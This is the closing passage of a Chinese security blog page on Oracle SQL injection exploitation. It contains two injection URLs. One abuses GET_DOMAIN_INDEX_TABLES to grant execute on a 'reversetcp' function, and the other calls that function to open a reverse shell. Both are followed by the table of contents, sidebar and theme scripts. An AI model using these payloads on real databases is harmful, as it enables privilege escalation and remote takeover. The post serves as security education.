+<h4 id="赋予函数执行权限-1"><a href="#赋予函数执行权限-1" class="headerlink" title="赋予函数执行权限"></a>赋予函数执行权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on reversetcp to public'''';END;'';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h4 id="反弹SHELL-1"><a href="#反弹SHELL-1" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.iswin.org/oracle.jsp?name=' and (<span class="keyword">select</span> sys.reversetcp <span class="keyword">from</span> dual) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/ORACLE/">ORACLE</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/JAVA/">JAVA</a><a href="/tags/ORACLE/">ORACLE</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="https://www.iswin.org/2015/06/13/hack-oracle/" data-title="Oracle Sql注入利用方法 | 随风&#39;S Blog" data-tsina="null" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2015/09/21/Druid-DataSource-ConnectString-Decrypt/" title="Druid数据连接池字符串解密">
+  <strong>上一篇：</strong><br/>
+  <span>
+  Druid数据连接池字符串解密</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2015/03/04/Elasticsearch-Groovy-remote-code-execution/"  title="Elasticsearch Groovy 远程代码执行漏洞">
+ <strong>下一篇：</strong><br/> 
+ <span>Elasticsearch Groovy 远程代码执行漏洞
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#数据获取"><span class="toc-number">1.</span> <span class="toc-text">数据获取</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#报错注入的几种方式"><span class="toc-number">1.1.</span> <span class="toc-text">报错注入的几种方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-utl-inaddr-get-host-name"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x1 utl_inaddr.get_host_name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-ctxsys-drithsx-sn"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x2 ctxsys.drithsx.sn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-XMLType"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x3 XMLType</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4-dbms-xdb-version-checkin"><span class="toc-number">1.1.4.</span> <span class="toc-text">0x4 dbms_xdb_version.checkin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5-dbms-xdb-version-makeversioned"><span class="toc-number">1.1.5.</span> <span class="toc-text">0x5 dbms_xdb_version.makeversioned</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x6-dbms-xdb-version-uncheckout"><span class="toc-number">1.1.6.</span> <span class="toc-text">0x6 dbms_xdb_version.uncheckout</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x7-dbms-utility-sqlid-to-sqlhash"><span class="toc-number">1.1.7.</span> <span class="toc-text">0x7 dbms_utility.sqlid_to_sqlhash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTL-HTTP-request的使用"><span class="toc-number">1.2.</span> <span class="toc-text">UTL_HTTP.request的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UTL-INADDR-GET-HOST-ADDRESS-amp-SYS-DBMS-LDAP-INIT"><span class="toc-number">1.3.</span> <span class="toc-text">UTL_INADDR.GET_HOST_ADDRESS&amp;SYS.DBMS_LDAP.INIT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-XXE-CVE-2014-6577"><span class="toc-number">1.4.</span> <span class="toc-text">Oracle XXE(CVE-2014-6577)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Oracle-提权漏洞"><span class="toc-number">2.</span> <span class="toc-text">Oracle 提权漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GET-DOMAIN-INDEX-TABLES函数注入漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">GET_DOMAIN_INDEX_TABLES函数注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#权限提升"><span class="toc-number">2.1.1.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令执行"><span class="toc-number">2.1.2.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#创建JAVA代码"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">创建JAVA代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#赋予JAVA执行权限"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">赋予JAVA执行权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#创建函数"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">创建函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#赋予函数执行权限"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">赋予函数执行权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#执行命令"><span class="toc-number">2.1.2.5.</span> <span class="toc-text">执行命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反弹SHELL"><span class="toc-number">2.1.3.</span> <span class="toc-text">反弹SHELL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#创建JAVA代码-1"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">创建JAVA代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#赋予JAVA执行权限-1"><span class="toc-number">2.1.3.2.</span> <span class="toc-text">赋予JAVA执行权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#创建函数-1"><span class="toc-number">2.1.3.3.</span> <span class="toc-text">创建函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#赋予函数执行权限-1"><span class="toc-number">2.1.3.4.</span> <span class="toc-text">赋予函数执行权限</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#反弹SHELL-1"><span class="toc-number">2.1.3.5.</span> <span class="toc-text">反弹SHELL</span></a></li></ol></li></ol></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">分类</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/JAVA/" title="JAVA">JAVA<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Python/Machine-Learning/" title="Machine Learning">Machine Learning<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ORACLE/" title="ORACLE">ORACLE<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Python/" title="Python">Python<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Spring/" title="Spring">Spring<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Struts2/" title="Struts2">Struts2<sup>1</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">标签</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/JAVA/" title="JAVA">JAVA<sup>10</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Deserialize/" title="Deserialize">Deserialize<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Python/" title="Python">Python<sup>2</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Spring/" title="Spring">Spring<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/RCE/" title="RCE">RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Machine-Learning/" title="Machine Learning">Machine Learning<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Scikit-Learn/" title="Scikit-Learn">Scikit-Learn<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Pybrain/" title="Pybrain">Pybrain<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Cdlinux/" title="Cdlinux">Cdlinux<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Struts2/" title="Struts2">Struts2<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/ORACLE/" title="ORACLE">ORACLE<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">友情链接</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="http://p2j.cn" target="_blank" title="园长博客">园长博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.shack2.org" target="_blank" title="Shack2博客">Shack2博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.cnseay.com" target="_blank" title="Seay博客">Seay博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.z7ys.com" target="_blank" title="z7y博客">z7y博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://bluereader.org" target="_blank" title="深蓝阅读">深蓝阅读</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.untnt.com" target="_blank" title="TNT博客">TNT博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.03sec.com/" target="_blank" title="Sky博客">Sky博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.jxcm.net/" target="_blank" title="DCC博客">DCC博客</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://cnbraid.com" target="_blank" title="Braid&#39;s Blog">Braid&#39;s Blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.xiyv.net" target="_blank" title="wolf&#39;s blog">wolf&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.blackh4t.org" target="_blank" title="DarkRay&#39;s BLoG">DarkRay&#39;s BLoG</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://www.00theway.org" target="_blank" title="00theway&#39;s Blog">00theway&#39;s Blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://bksec.net/" target="_blank" title="my5t3ry&#39;s Blog">my5t3ry&#39;s Blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.00day.com/" target="_blank" title="Luoye&#39;s blog">Luoye&#39;s blog</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="https://www.imbeee.com" target="_blank" title="Beeeの零碎事">Beeeの零碎事</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> 当才华还撑不起野心时，那就应该静下心来学习。 <br/>
+			当能力还驾奴不了目标时，就应该沉下心来历练。</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
+		
+		<a href="/about" target="_blank" title="iswin">iswin</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#nothing"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
